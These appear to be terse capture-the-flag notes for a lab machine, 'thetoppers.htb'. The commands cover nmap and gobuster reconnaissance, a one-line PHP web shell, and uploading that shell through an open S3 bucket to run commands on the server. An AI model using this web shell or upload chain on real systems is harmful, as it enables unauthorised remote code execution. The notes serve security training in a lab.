sudo nmap -sV 10.129.227.248

echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts


gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.150.33 -x php
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb



echo '<?php system($_GET["cmd"]); ?>' > shell.php
http://thetoppers.htb/shell.php?cmd=id

####aws
apt install awscli
aws configure
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
